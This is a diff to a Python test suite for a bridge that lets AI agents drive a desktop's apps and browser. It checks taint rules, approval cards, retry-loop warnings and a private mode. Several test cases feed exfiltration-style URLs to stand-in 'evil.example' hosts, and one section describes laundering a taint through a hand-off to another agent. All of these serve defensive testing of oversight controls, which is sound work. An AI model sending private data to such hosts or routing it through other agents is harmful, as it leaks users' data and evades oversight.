@@ -65,6 +65,7 @@ import io
 import json
 import os
 import pathlib
+import re
 import socket
 import stat
 import sys
@@ -181,6 +182,11 @@ revision: c0ffee
 # grades them in control_agent_terminal.rs).
 SHELL_ACTIONS = """  act: open_app(name)  [standard, settles later]
        Launch an app, or focus it if it is already running.
+  act: read_mind_view(region?)  [safe, settles on return]
+       Read the text on Mind View from its pixels.
+         region?: string - x,y,w,h
+  act: send_message(text)  [standard, settles later]
+       Ask the desktop something, as if typed into the Lens.
   act: agent_run(command, cwd?, wait?)  [sensitive, settles later]
        Run one command line in a fresh terminal of your own, in your pane.
          command: string - one command line, as it would be typed
@@ -218,6 +224,43 @@ SHELL_ACTIONS = """  act: open_app(name)  [standard, settles later]
          task: string - what it is to do
          context?: string - what it should read first
          wait_seconds?: number - seconds to wait for its answer
+"""
+# The browser's surface (apps/browser, #477): what every web_* tool is an act on now, with the
+# grades it publishes — looking is safe, using a page standard, and a commitment sensitive and
+# not recoverable, so it asks in every mode but bypass.
+DESCRIBE_BROWSER = """Browser - "Example" (example.com)
+revision: b0b0
+{
+  "open": true
+}
+  act: read(tab?, all?)  [safe, settles on return]
+       What is on the page.
+  act: text(tab?, limit?)  [safe, settles on return]
+       What the page says.
+  act: go(url, new_tab?, tab?)  [standard, settles on return]
+       Open a web page.
+         url: string - where
+  act: click(ref, tab?)  [standard, settles on return]
+       Press an element.
+         ref: string - an element's ref
+  act: type(ref, text, clear?, enter?, tab?)  [standard, settles on return]
+       Type into a field.
+         ref: string - an element's ref
+         text: string - what to type
+  act: press(key, ref?, tab?)  [standard, settles on return]
+       Press a key.
+         key: string - the key
+  act: select(ref, option, tab?)  [standard, settles on return]
+       Choose an option in a list.
+         ref: string - an element's ref
+         option: string - the option's text
+  act: dialog(accept?, text?, tab?)  [standard, settles on return]
+       Answer the page's dialog.
+  act: commit(ref, label, site, tab?)  [sensitive, settles on return]
+       Press a control whose label reads as a commitment. What it does cannot be undone.
+         ref: string - the control's ref
+         label: string - its label
+         site: string - the page's site
 """
 DESCRIBE_TERMINAL = """Terminal - 1 tab
 revision: 7e57
@@ -293,6 +336,9 @@ if argv[:1] == ["describe"]:
     if target == "calendar":
         sys.stdout.write(DESCRIBE_CALENDAR)
         raise SystemExit(0)
+    if target == "browser":
+        sys.stdout.write(DESCRIBE_BROWSER)
+        raise SystemExit(0)
     if target == "terminal" and state.get("terminal_open"):
         sys.stdout.write(DESCRIBE_TERMINAL)
         raise SystemExit(0)
@@ -330,7 +376,7 @@ if argv[:1] == ["act"]:
         grant = rest[at + 1]
         rest = rest[:at] + rest[at + 2:]
     no_ask = "--no-ask" in rest
-    rest = [a for a in rest if a != "--no-ask"]
+    rest = [a for a in rest if a not in ("--no-ask", "--full")]
     args = parse_args(rest, declared(target, action))
     # An agent started as a catalog role, asking about or acting outside its reach: the shell and
     # the app's own dispatch refuse it in the reach's words (yantrik_ipc_transport::reach) — before
@@ -365,6 +411,16 @@ if argv[:1] == ["act"]:
             spent_refusal("wrong app.")
         state.setdefault("spent", []).append(grant)
         save(state)
+
+    if target == "browser" and args.get("ref") == "e404":
+        die("browser.app.act refused: PAGE: e404 is no longer on the page — it changed since it "
+            "was read. Read it again and use the new ref.")
+    if target == "browser":
+        # What reached the browser, for the checks that nothing did.
+        state.setdefault("web", []).append([action, args])
+        save(state)
+        envelope({"did": "%s done" % action, "url": "https://example.com/", "title": "Example"})
+        raise SystemExit(0)
 
     if target == "shell" and action == "request_approval":
         if state.get("shell_down"):
@@ -1176,6 +1232,108 @@ with tempfile.TemporaryDirectory() as d:
           not is_error and text.startswith("REFUSED") and "already read private state" in text, text)
     check("and nothing reached the browser", not read(state).get("web"), read(state))
 
+    # 15e. The web tools are acts on the browser's surface (#477): made there through os_act, so
+    # its grades, the mode, the cards and the taint are the ones every app meets.
+    module, state = case(tmp, "web-surface", mode="ask", answer="pending")
+    # The page is rendered by the real yos's `render_browser` — the one renderer the command
+    # line uses — loaded the way the bridge loads it, in place of the fake's (which has none).
+    from importlib.machinery import SourceFileLoader
+    import importlib.util as _iu
+    _loader = SourceFileLoader("yos_renderer", str(HERE / "yos"))
+    _real = _iu.module_from_spec(_iu.spec_from_loader("yos_renderer", _loader))
+    _loader.exec_module(_real)
+    saved_module = list(module._YOS_MODULE)
+    module._YOS_MODULE[:] = [_real]
+    text, is_error = module.run_tool(module.BY_NAME["web_click"], {"ref": 12})
+    module._YOS_MODULE[:] = saved_module
+    s = read(state)
+    check("web_click is an act on the browser, with the ref as the browser writes it",
+          not is_error and ["click", {"ref": "e12"}] in s.get("web", []), (text, s.get("web")))
+    check("and its answer reaches the mind as a sentence, not JSON",
+          text.startswith("Click done") and "{" not in text, text)
+    text, is_error = module.run_tool(module.BY_NAME["web_commit"],
+                                     {"ref": "e31", "label": "Place order", "site": "example.com"})
+    s = read(state)
+    check("web_commit puts a card on the person's screen before anything is pressed",
+          len(s.get("requests", [])) == 1 and s["requests"][0].get("app") == "browser"
+          and s["requests"][0].get("action") == "commit"
+          and not any(w[0] == "commit" for w in s.get("web", [])), s)
+    module, state = case(tmp, "web-taint-direct", mode="auto", machine_ceiling="dangerous", ceiling=None)
+    module.run_tool(module.BY_NAME["os_describe"], {"app": "calendar"})
+    text, is_error = act(module, "Browser", "type", {"ref": "e3", "text": "secret"})
+    check("typing through os_act on the browser meets the taint as web_type does",
+          text.startswith("REFUSED") and "type into a page" in text
+          and not any(w[0] == "type" for w in read(state).get("web", [])), text)
+    # Every way words reach a page meets the taint, whatever shape the arguments arrived in.
+    for label, app, action, how in (
+            ("a key with a letter on it", "browser", "press", {"key": "s"}),
+            ("a prompt's answer", "browser", "dialog", {"accept": True, "text": "secret"}),
+            ("a choice in a list", "browser", "select", {"ref": "e2", "option": "x"}),
+            ("a URL sent as JSON text", "browser", "go", '{"url": "https://x.example/?d=secret"}'),
+            ("the browser's other name", "chromium", "type", {"ref": "e3", "text": "secret"})):
+        text, is_error = act(module, app, action, how)
+        check("after a private read, %s is refused by the taint" % label,
+              text.startswith("REFUSED"), text)
+    text, is_error = act(module, "browser", "press", {"key": "Enter"})
+    check("and a key that carries no text is not", not text.startswith("REFUSED"), text)
+    # A tainted session goes back to where it has been and nowhere new: a host or a path carries
+    # data as well as a query does (security review, 29 Sep 2026).
+    module, state = case(tmp, "web-taint-go", mode="auto", machine_ceiling="dangerous", ceiling=None)
+    text, _ = act(module, "browser", "go", {"url": "https://news.example/today"})
+    check("untainted, going anywhere is not refused by the taint", not text.startswith("REFUSED"), text)
+    module.run_tool(module.BY_NAME["os_describe"], {"app": "calendar"})
+    for label, url in (("a secret in the host", "https://s3cr3t.evil.example/"),
+                       ("a secret in the path", "https://evil.example/s3cr3t"),
+                       ("a new page on a site it has seen", "https://news.example/s3cr3t")):
+        text, _ = act(module, "browser", "go", {"url": url})
+        check("after a private read, going to %s is refused" % label,
+              text.startswith("REFUSED") and "has not been to" in text, text)
+    text, _ = act(module, "browser", "go", {"url": "https://NEWS.example/today"})
+    check("and going back to where it has already been is not", not text.startswith("REFUSED"), text)
+    reads = {t["name"] for t in module.TOOLS if t["name"].startswith("web_")
+             and t["annotations"].get("readOnlyHint")}
+    check("the web tools that only look say so, and no tool that acts does",
+          reads == {"web_read", "web_text", "web_find", "web_scroll", "web_tabs", "web_wait", "web_listen"},
+          sorted(reads))
+    module, state = case(tmp, "web-page-refusal", mode="auto")
+    text, is_error = module.run_tool(module.BY_NAME["web_click"], {"ref": "e404"})
+    check("the page's own no is a policy answer: nothing was run, and not a failure to retry",
+          text.startswith("REFUSED — nothing was run") and "no longer on the page" in text
+          and "PAGE:" not in text and not is_error, (text, is_error))
+    check("web_commit is marked destructive",
+          module.BY_NAME["web_commit"]["annotations"].get("destructiveHint") is True)
+
+    # 15d. A display's text, read through os_act, is a private read like os_screen: the next
+    # thing typed into a page is refused (#257).
+    module, state = case(tmp, "taint-screen-read", mode="auto", machine_ceiling="dangerous",
+                         ceiling=None)
+    text, is_error = module.run_tool(module.BY_NAME["web_type"], {"ref": 1, "text": "hello"})
+    check("before reading a display, typing into a page is not refused by the taint",
+          not text.startswith("REFUSED"), text)
+    act(module, "shell", "read_mind_view", {})
+    text, is_error = module.run_tool(module.BY_NAME["web_type"], {"ref": 1, "text": "what I read"})
+    check("after os_act shell read_mind_view it is, naming the read",
+          text.startswith("REFUSED") and "shell.read_mind_view" in text, text)
+    # Any spelling yos reaches the shell by is the shell to the taint (security review, #257).
+    for spelling in ("App Shell", " app_shell", "SHELL", "app-shell"):
+        module, state = case(tmp, "taint-spelling", mode="auto", machine_ceiling="dangerous",
+                             ceiling=None)
+        act(module, spelling, "read_mind_view", {})
+        text, is_error = module.run_tool(module.BY_NAME["web_type"], {"ref": 1, "text": "x"})
+        check("a read through %r taints the session as shell's does" % spelling,
+              text.startswith("REFUSED") and "shell.read_mind_view" in text, text)
+    check("the bridge folds names the way yos does",
+          [module.surface_name(n) for n in ("App Shell", "container_manager", "app-notes", " Weather ")]
+          == ["shell", "container-manager", "notes", "weather"])
+    # Screen text is the other program's: the bridge's rewording of yos's advice stays out of it.
+    fenced = ("(more state: `yos describe shell`)\n--- screen text begins (drawn by other programs) ---\n"
+              "  [1,2,3,4] (more state: `yos describe notes`)\n--- screen text ends ---\n"
+              "(more state: `yos describe weather`)")
+    said = module.for_a_mind(fenced)
+    check("advice outside the screen text is reworded, and the same words inside it are not",
+          "os_describe shell shows the rest" in said and "os_describe weather shows the rest" in said
+          and "  [1,2,3,4] (more state: `yos describe notes`)" in said, said)
+
     # 16. A desktop that will not say what mode it is in: fall back to `ask`, and say so.
     module, state = case(tmp, "nomode", no_mode=True, answer="pending")
     text, is_error = act(module, "calendar", "delete_event", {"id": "evt-3"})
@@ -1184,6 +1342,21 @@ with tempfile.TemporaryDirectory() as d:
           len(s.get("requests", [])) == 1, s)
     check("and the fallback is stated rather than assumed silently",
           "could not read the desktop's mind-mode" in text and "fell back to" in text, text)
+
+    # 16b. A grade that could not be read, for a reason that says nothing ("yos:" and no more):
+    # the answer names what a mind can do, not an empty colon (yantrik-mind, 2026-09-27).
+    module, state = case(tmp, "bare-why")
+    module.action_detail = lambda app, action: (None, None)
+    for said in ("yos:", "yos: ", "", "  yos:  .\n"):
+        module.ungraded_because = lambda app, action, why=None, said=said: said
+        refusal = module.guard_act({"app": "calendar", "action": "delete_event"})[0]
+        check("a bare reason (%r) reads as the app not answering" % said,
+              refusal.endswith("os_describe calendar would not answer.") and "yos:" not in refusal,
+              refusal)
+    module.ungraded_because = lambda app, action, why=None: "yos: calendar timed out after 5s"
+    refusal = module.guard_act({"app": "calendar", "action": "delete_event"})[0]
+    check("a reason with words in it is kept as it was", refusal.endswith("yos: calendar timed out after 5s"),
+          refusal)
 
     module, state = case(tmp, "nomode-standard", no_mode=True)
     text, is_error = act(module, "calendar", "add_event", {"title": "X", "date": "2026-10-02"})
@@ -1704,6 +1877,47 @@ with tempfile.TemporaryDirectory() as d:
     text, is_error = module.run_tool(module.BY_NAME["web_type"], {"ref": 1, "text": "secret"})
     check("after read_agent, it is", text.startswith("REFUSED") and "read_agent" in text, text)
 
+    # 23t. A hand-off from a session that has read private state asks, whatever the mode. The
+    # agent on the other end has read nothing private, so its own bridge is clean and would type
+    # what it was handed into any page: the taint would be laundered through it. Untainted, the
+    # same hand-off runs as the mode says.
+    for mode in ("auto", "bypass"):
+        module, state = case(tmp, "handoff-taint-" + mode, mode=mode, machine_ceiling="dangerous",
+                             answer="granted", ceiling=None, token=TOKEN)
+        module.run_tool(module.BY_NAME["os_describe"], {"app": "calendar"})
+        told = module.call_tool(module.AGENT_BY_NAME["send_to_agent"],
+                                {"agent": CHILD, "text": "Dentist 25 Sep 10:00"})
+        s = read(state)
+        reqs = s.get("requests", [])
+        check("in %s, a tainted session's send_to_agent puts a card up" % mode,
+              [r.get("action") for r in reqs] == ["send_to_agent"], reqs)
+        check("the card says what the message carries",
+              reqs and "Carries what this session has read (os_describe)" in str(reqs[0].get("purpose")),
+              reqs)
+        check("and the mind is told why it was asked, in its own words",
+              "already read private state" in told[0] and "not something to route around" in told[0],
+              told[0])
+        check("allowed, it runs once, with the grant it was minted for",
+              [(a["action"], a.get("grant")) for a in s.get("acted", [])] == [("send_to_agent", "appr-1")],
+              s.get("acted"))
+    module, state = case(tmp, "handoff-taint-denied", mode="auto", answer="denied", ceiling=None,
+                         token=TOKEN)
+    module.run_tool(module.BY_NAME["os_describe"], {"app": "calendar"})
+    told = module.call_tool(module.AGENT_BY_NAME["new_agent"], {"mind": "pi", "task": "post it"})
+    check("refused, a tainted hand-off does not reach the other mind",
+          not [a for a in read(state).get("acted", []) if a["action"] == "new_agent"]
+          and told[0].startswith("REFUSED"), (told[0][:120], read(state).get("acted")))
+    module, state = case(tmp, "handoff-lens", mode="auto", ceiling=None)
+    module.run_tool(module.BY_NAME["os_describe"], {"app": "calendar"})
+    act(module, "shell", "send_message", {"text": "Dentist 25 Sep 10:00"})
+    check("a message put into the Lens by a tainted session is a hand-off too, and asks",
+          [r.get("action") for r in read(state).get("requests", [])] == ["send_message"], read(state))
+    module, state = case(tmp, "handoff-clean", mode="auto", ceiling=None, token=TOKEN)
+    module.call_tool(module.AGENT_BY_NAME["send_to_agent"], {"agent": CHILD, "text": "and the notes"})
+    check("untainted, send_to_agent in auto runs as the mode says, unasked",
+          not read(state).get("requests") and [a["action"] for a in read(state).get("acted", [])]
+          == ["send_to_agent"], read(state))
+
     # 23d. In `auto`, new_agent runs unasked and is written down — without the token; a token a
     # mind puts among the arguments is dropped; and one the desktop echoes back is scrubbed.
     module, state = case(tmp, "agents-auto", mode="auto", ceiling=None, token=TOKEN, echo_token=True)
@@ -1941,8 +2155,21 @@ with tempfile.TemporaryDirectory() as d:
                        "XDG_DATA_HOME": str(tmp / "no-apps")})
     try:
         module = load_mcp(HERE / "yos", tmp / "real-yos.json")
+        started = time.monotonic()
         listing, listing_failed = module.run_tool(module.BY_NAME["os_apps"], {})
         described, describe_failed = module.run_tool(module.BY_NAME["os_describe"], {"app": "harness"})
+        in_process_took = time.monotonic() - started
+        ran_in_process = bool(module._YOS_MODULE) and module._YOS_MODULE[0] is not None
+        started = time.monotonic()
+        module.run_tool(module.BY_NAME["os_apps"], {})
+        module.run_tool(module.BY_NAME["os_describe"], {"app": "harness"})
+        warm_took = time.monotonic() - started
+        # The same two reads as processes, for the comparison #41 is about.
+        module.IN_PROCESS = set()
+        started = time.monotonic()
+        as_process = (module.run_tool(module.BY_NAME["os_apps"], {}),
+                      module.run_tool(module.BY_NAME["os_describe"], {"app": "harness"}))
+        as_process_took = time.monotonic() - started
     finally:
         for key, value in saved_env.items():
             if value is None:
@@ -1959,6 +2186,105 @@ with tempfile.TemporaryDirectory() as d:
     check("os_describe on it anyway says what it is and where to look, not only that it failed",
           describe_failed and "plumbing, not an app or a service" in described
           and "yos ls" in described, described)
+    check("the reading tools run the real yos in this process, not as a process each (#41)",
+          ran_in_process, "yos could not be loaded in-process")
+    check("and answer exactly what the process answers",
+          as_process == ((listing, listing_failed), (described, describe_failed)),
+          (as_process, listing, described))
+    print("     two reads: %.1f ms in-process the first time (loading yos), %.1f ms after, "
+          "%.1f ms as processes" % (in_process_took * 1000, warm_took * 1000, as_process_took * 1000))
+
+# An act's result carries no command-line advice (yantrik-mind, 2026-09-26): "re-run with --full"
+# is for someone at a terminal, and a model reads "re-run" as "call it again".
+with tempfile.TemporaryDirectory() as t:
+    module = load_mcp(HERE / "yos", pathlib.Path(t) / "loops.json")
+    printed = ("New tab: untitled-2\naccepted: True, settled: True\nrevision: 3f\n"
+               "(state omitted; `yos describe editor`, or re-run with --full)")
+    said = module.for_a_mind(printed)
+    check("an act's result names the tool a mind has, not the command line's --full",
+          "os_describe editor" in said and "--full" not in said and "re-run" not in said, said)
+    check("and says the action is done, not to repeat it", "do not repeat it" in said, said)
+    check("everything else in the result is left as it was",
+          said.startswith("New tab: untitled-2\naccepted: True, settled: True\nrevision: 3f\n"), said)
+
+# An act prints the app's small state fields as facts (yantrik-os, 2026-09-27): what a mind used to
+# scrape out of the summary ("…, unsaved") arrives as `modified`, and the line reaches the mind whole.
+with tempfile.TemporaryDirectory() as t:
+    module = load_mcp(HERE / "yos", pathlib.Path(t) / "loops.json")
+    printed = ('Text Editor — notes.txt, 1 line, unsaved\naccepted: True, settled: True\nrevision: 3f\n'
+               'state: {"path":"/home/yantrik/notes.txt","modified":true,"tabs":1}\n'
+               '(more state: `yos describe editor`)')
+    said = module.for_a_mind(printed)
+    check("the state line reaches a mind as it was printed",
+          'state: {"path":"/home/yantrik/notes.txt","modified":true,"tabs":1}\n' in said, said)
+    check("and what it left out is named by the tool a mind has",
+          "os_describe editor" in said and "yos describe" not in said and "do not repeat it" in said, said)
+
+# A mind going round in circles is told so in the one place it reads while it works: the call's
+# own result (#234). The 23 September game: the editor refused four times, "Cannot open".
+with tempfile.TemporaryDirectory() as t:
+    module = load_mcp(HERE / "yos", pathlib.Path(t) / "loops.json")
+    call = {"app": "editor", "action": "open", "args": {"path": "~/Documents/Ridge-Runners/game.js"}}
+    refused = "refused: Cannot open: No such file"
+    said = [module.going_round("os_act", call, refused, True) for _ in range(5)]
+    check("the first two refusals come back as they were",
+          said[0] == refused and said[1] == refused, said[:2])
+    check("the third says, from the desktop, that it is going round and what to do instead",
+          said[2].startswith(refused + "\n\n[From the desktop: This call has now failed the same way 3 times")
+          and "os_describe" in said[2] and "tell the person" in said[2], said[2])
+    check("the fifth says stop", "Stop retrying it." in said[4], said[4])
+    check("a success in between starts the count again",
+          module.going_round("os_act", call, "done", False) == "done"
+          and module.going_round("os_act", call, refused, True) == refused)
+    other = dict(call, args={"path": "~/Documents/Ridge-Runners/index.html"})
+    for text in (refused, refused):
+        module.going_round("os_act", call, text, True)
+    check("a different call is a different attempt, not the same one again",
+          module.going_round("os_act", other, refused, True) == refused)
+    policy = "REFUSED — nothing was run. refused: the person denied this"
+    for _ in range(2):
+        module.going_round("os_act", call, policy, False)
+    check("a REFUSED policy answer counts as the same failure too, flagged or not",
+          "[From the desktop:" in module.going_round("os_act", call, policy, False))
+
+# Private mode: every caller of this bridge is an agent, so while the person is private no tool
+# runs at all.
+with tempfile.TemporaryDirectory() as t:
+    tmp = pathlib.Path(t)
+    # Not even a read the sockets could not tell from the person's own. The
+    # file fails closed: anything but a clear `"private": false` is private.
+    module, state = case(tmp, "private", token=TOKEN)
+    home = tmp / "private-home"
+    (home / ".config" / "yantrik").mkdir(parents=True)
+    privacy = home / ".config" / "yantrik" / "privacy.json"
+    replies, ran = [], []
+    module.reply = lambda msg_id, result=None, error=None: replies.append(result or error)
+    module.call_tool = lambda tool, arguments: ran.append(tool["name"]) or ("ran", False, None)
+    saved_home = os.environ.get("HOME")
+    os.environ["HOME"] = str(home)
+    try:
+        check("no privacy file is not private", not module.private_now())
+        privacy.write_text(json.dumps({"private": True, "since": 1}), encoding="utf-8")
+        module.serve_call(7, module.BY_NAME["os_describe"], {"app": "shell"})
+        said = replies[-1]["content"][0]["text"]
+        check("while private, a tool answers with the transport's refusal and runs nothing",
+              replies[-1]["isError"] and said.startswith("PRIVATE:") and not ran, (replies[-1], ran))
+        privacy.write_text("{", encoding="utf-8")
+        check("a privacy file that cannot be read is private", module.private_now())
+        privacy.write_text(json.dumps({"private": False}), encoding="utf-8")
+        check("and a clear false is not", not module.private_now())
+    finally:
+        if saved_home is None:
+            os.environ.pop("HOME", None)
+        else:
+            os.environ["HOME"] = saved_home
+    rust = (HERE.parent.parent / "crates/yantrik-ipc-transport/src/privacy.rs").read_text(encoding="utf-8")
+    # A string continuation (a backslash at a line end) drops the newline and the next line's
+    # indent, as rustc does.
+    refusal = re.search(r'pub const REFUSAL: &str = "(.*?)";', re.sub(r"\\\n\s*", "", rust), re.S)
+    check("the refusal is the transport's word for word",
+          refusal is not None and refusal.group(1) == module.PRIVACY_REFUSAL,
+          refusal.group(1) if refusal else "no REFUSAL in privacy.rs")
 
 print()
 if failures:
